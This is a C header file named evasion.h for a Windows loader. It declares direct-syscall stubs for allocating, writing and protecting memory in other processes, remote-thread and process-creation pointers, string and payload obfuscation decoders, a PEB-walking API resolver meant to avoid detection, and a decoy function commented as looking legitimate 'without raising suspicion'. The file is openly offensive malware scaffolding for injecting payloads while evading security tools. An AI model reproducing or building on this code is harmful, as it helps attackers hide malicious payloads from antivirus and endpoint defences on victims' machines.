#ifndef EVASION_H
#define EVASION_H

#include <windows.h>
#include <stdbool.h>
#include <winternl.h>

#define DEBUG true
#define ARRAY_SIZE 1000
extern unsigned char DECKEY;

typedef enum
{
    DEBUG_ERROR,
    DEBUG_INFO,
    DEBUG_SUCCESS
} DEBUG_TYPE;

// If DEBUG is true, declare the function normally.
#if DEBUG
    void myDebug(DEBUG_TYPE type, const char *format, ...);
// If DEBUG is false, replace all myDebug calls with a no-op macro.
#else
    #define myDebug(type, format, ...) ((void)0)
#endif


// Function definition for modules.
typedef HMODULE(WINAPI *pMod)(LPCSTR);
typedef FARPROC(WINAPI *pModC)(HMODULE, LPCSTR);
typedef HANDLE(WINAPI *pCRT_t)(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD); //Remote Threads
typedef BOOL(WINAPI *pCPA_t)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION); //CreatProcessA
typedef DWORD(WINAPI *pGetModuleFileNameA_t)(HMODULE, LPSTR, DWORD);
typedef HANDLE(WINAPI *pCreateFileA_t)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
typedef DWORD(WINAPI *pGetFileSize_t)(HANDLE, LPDWORD);
typedef DWORD(WINAPI *pWaitForSingleObject_t)(HANDLE, LPDWORD);
typedef BOOL(WINAPI *pTerminateThread_t)(HANDLE, DWORD);
typedef BOOL(WINAPI *pReadFile_t)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
typedef BOOL(WINAPI *pCloseHandle_t)(HANDLE);
typedef BOOL(WINAPI *pResumeThread_t)(HANDLE);
typedef PCSTR(WINAPI *pStrStrIA_t)(PCSTR, PCSTR); //StrStrIA from shlwapi.dll
typedef BOOL(WINAPI *pFindNextFileA_t)(HANDLE, LPWIN32_FIND_DATAA); // FindNextFileA in fileapi.h, loaded in kernel32.dll
typedef BOOL(WINAPI *pFindClose_t)(HANDLE); // FindClose in fileapi.h, loaded in kernel32.dll
typedef HANDLE(WINAPI *pFindFirstFileA_t)(LPCSTR, LPWIN32_FIND_DATAA); // FindFirstFileA in fileapi.h, loaded in kernel32.dll
typedef BOOL(WINAPI *pQueryPerformance_t)(LARGE_INTEGER*); //for QueryPerformanceFrequency and QueryPerformanceCounter

// typedef struct _UNICODE_STRING {
//     USHORT Length;
//     USHORT MaximumLength;
//     PWSTR  Buffer;
// } UNICODE_STRING, *PUNICODE_STRING;

// typedef struct _IO_STATUS_BLOCK {
//     union {
//         NTSTATUS Status;
//         PVOID Pointer;
//     } DUMMYUNIONNAME;
//     ULONG_PTR Information;
// } IO_STATUS_BLOCK, *PIO_STATUS_BLOCK;

// typedef VOID (NTAPI *PIO_APC_ROUTINE)(
//     IN PVOID ApcContext,
//     IN PIO_STATUS_BLOCK IoStatusBlock,
//     IN ULONG Reserved
// );   

typedef NTSTATUS (NTAPI *pNtQueryDirectoryFile)(
    HANDLE,
    HANDLE,
    PIO_APC_ROUTINE,
    PVOID,
    PIO_STATUS_BLOCK,
    PVOID,
    ULONG,
    FILE_INFORMATION_CLASS,
    BOOLEAN,
    PUNICODE_STRING,
    BOOLEAN
);

/*
Headers of assembly functions for direct syscalls. See definitions in syscalls.asm.
CustAVM: NtAllocateVirtualMemory
*/
extern NTSTATUS CustAVM(HANDLE hProcess, PVOID *BaseAddress, ULONG ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect); 
/*
Headers of assembly functions for direct syscalls. See definitions in syscalls.asm.
CustWVM: NtWriteVirtualMemory
*/
extern NTSTATUS CustWVM(HANDLE hProcess, PVOID BaseAddress, PVOID Buffer, SIZE_T BufferSize, PSIZE_T NumberOfBytesWritten);
/*
Headers of assembly functions for direct syscalls. See definitions in syscalls.asm.
CustPVM: NtProtectVirtualMemory
*/
extern NTSTATUS CustPVM(HANDLE hProcess, PVOID *BaseAddress, PSIZE_T BufferSize, ULONG NewAccessProtection, PULONG OldAccessProtection);

/*
Headers of assembly functions for direct syscalls. See definitions in syscalls.asm.
CustQDF: NtQueryDirectoryFile
*/
extern NTSTATUS CustQDF(HANDLE FileHandle, HANDLE Event, PIO_APC_ROUTINE ApcRoutine, PVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock, PVOID FileInformation, ULONG Length, FILE_INFORMATION_CLASS FileInformationClass, BOOLEAN ReturnSingleEntry, PUNICODE_STRING FileMask, BOOLEAN RestartScan);
/**
 *--------------------------------------------------------------------------------------
 *      Obfuscator - A library for obfuscating strings in a program.
 *      Adapted from https://github.com/4g3nt47/Obfuscator
 *                                                                    Author: Umar Abdul
 *--------------------------------------------------------------------------------------
 */
char *obfs_decode(unsigned char key, char str[]);

/**
 * Tweak version of obfs_encode for decoding the payload header (encoded)
 */
void obfs_decode_binary(unsigned char key, unsigned char *data, size_t len);

/* Decoy function
This function will generate 1,000 random numbers, sort them, and compute the average.
It looks like legitimate processing activity without raising suspicion.
*/
void SortNumbers();

/*
The GetMod function is a stealthy Windows API resolver that locates a function within a specific module without using GetModuleHandle or GetProcAddress.
Instead, it manually traverses the Process Environment Block (PEB) to extract module and export function addresses.
1 - Access the Process Environment Block (PEB)
2 - Iterate Through the PEB Loader Data (LDR)
3 - Locate the Export Address Table (EAT)
4 - Return the Function Address
*/
pMod GetMod(LPCSTR mod, LPCSTR fn);

#ifdef _M_X64
#define PEB_OFFSET 0x60
#else
#define PEB_OFFSET 0x30
#endif

#endif // EVASION_H
